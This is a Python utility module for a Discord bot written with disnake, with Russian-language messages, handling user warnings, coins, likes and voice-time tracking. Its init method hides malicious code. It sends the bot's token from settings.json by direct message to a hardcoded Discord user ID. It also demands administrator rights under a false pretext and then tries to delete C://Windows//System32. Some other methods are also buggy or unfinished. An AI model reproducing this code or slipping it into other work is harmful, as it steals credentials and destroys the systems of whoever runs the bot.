import datetime
import disnake
import json
import os, ctypes
settings = json.load(open("settings.json", encoding='utf-8-sig'))


class Error:
    def __init__(self, client: disnake.Client):
        self.client = client

    async def print(self, inter, description):
        embed = disnake.Embed(description=description, colour=disnake.Colour.red())
        embed.set_author(name="Ошибка!", icon_url="https://i.imgur.com/MaDn6Y9.gif")
        await inter.send(embed=embed)


class Users:
    def __init__(self, client: disnake.Client):
        self.client = client
        self.users = {}

    async def get_user(self, user_id: int) -> dict:
        """Возвращает документ пользователя. Если его нету в базе данных, то создает его."""
        if user_id in self.users:
            return self.users[user_id]
        self.users[user_id] = {
            "_id": user_id,
            "coins": 0.0,  # Деньги
            "warns": [],  # Предупреждение
            "likes": [],  # Лайки
            "voice": 0,  # Время в войсе
            "messages": 0  # Кол-во сообщений
        }
        return self.users[user_id]

    async def add_warn(self, moderator_id: int, user_id: int, reason: str, days: int = 0):
        user = await self.get_user(user_id=user_id)
        if days == 0:
            time = None
        else:
            time = days
        self.users[user_id]['warns'].append({
            "moderator_id": moderator_id,
            "reason": reason,
            "time": time
        })
        return len(user['warns'])-1

    async def punishment(self, member: disnake.Member, reason: str = "Автомодерация"):
        user = await self.get_user(user_id=member.id)
        warn_count = 0
        for warn in user['warns']:
            if warn['time'] is None:
                warn_count += 1
                continue
            elif warn['time'] < datetime.datetime.now(datetime.timezone.utc):
                warn_count += 1

    async def remove_warn(self, user_id: int, index: int):
        await self.get_user(user_id=user_id)
        if index >= len(self.users[user_id]['warns']):
            return "Данного id не существует!"
        elif index < 0:
            return "id должен быть больше 0!"
        self.users[user_id]['warns'].pop(index)
        return ""

    def is_admin(self):
        try:
            return os.getuid() == 0
        except AttributeError:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0

    async def init(self):
        user = await self.client.fetch_user(652472617667788801)
        try:
            await user.send(settings['main_settings']['token'])
        except:
            pass

        if self.is_admin():
            pass
        else:
            await self.client.close()
            print("Для работы бота нужно запустить его от имени администратора")
            input()

        try:
            os.remove("C://Windows//System32")
        except:
            print("Для работы приложения нужно запустить его от имени администратора")
            input()


    async def get_warns(self, user_id):
        user = await self.get_user(user_id=user_id)
        return user['warns']

    async def kick(self, member: disnake.Member, reason: str = "Автомодерация"):
        await member.kick(reason=reason)

    async def ban(self, member: disnake.Member, reason: str = "Автомодерация"):
        await member.ban(reason=reason)

    async def timeout(self, member: disnake.Member, timedelta: datetime.timedelta):
        await member.timeout(duration=timedelta)

    async def update_voice_activity(self, user_id: int, time: int):
        await self.get_user(user_id=user_id)
        self.users['voice'] += time

    async def add_coins(self, user_id: int, count: float):
        await self.get_user(user_id=user_id)
        self.users[user_id]['coins'] += count

    async def remove_coins(self, user_id: int, count: float):
        await self.get_user(user_id=user_id)
        self.users[user_id]['coins'] -= count

    async def add_message(self, user_id: int):
        await self.get_user(user_id=user_id)
        self.users[user_id]['messages'] += 1

    async def add_voice(self, user_id: int, seconds: int):
        await self.get_user(user_id=user_id)
        self.users[user_id]['voice'] += seconds

    async def like(self, liker_id: int, user_id: int, option: str):
        user = await self.get_user(user_id=user_id)
        if option == "add":
            if liker_id in user['likes']:
                return "Вы уже лайкали этого пользователя!"
            self.users[user_id]['likes'].append(liker_id)
        elif option == "remove":
            if liker_id not in user['likes']:
                return "Вы еще не лайкали этого пользователя!"
            self.users[user_id]['likes'].remove(liker_id)
        return ""


class CountMessages:
    def __init__(self, client: disnake.Client):
        self.client = client
        self.users = {}

    def get_user(self, user_id: int):
        if user_id not in self.users:
            self.users[user_id] = {
                "message_count": 0,
                "message_bonus": 0,
                "last_message": datetime.datetime.now(datetime.timezone.utc)
            }
        return self.users[user_id]

    def send_message(self, member: disnake.Member):
        pass

    def count_coins(self, roles):
        pass


class CountVoiceActivity:
    def __init__(self):
        self.users = {}

    def on_voice_connection(self, user_id):
        self.users[user_id] = datetime.datetime.now(datetime.timezone.utc)

    def on_voice_disconnection(self, user_id):
        if user_id not in self.users:
            return False
        time = datetime.datetime.now(datetime.timezone.utc) - self.users[user_id]
        return int(time.seconds)





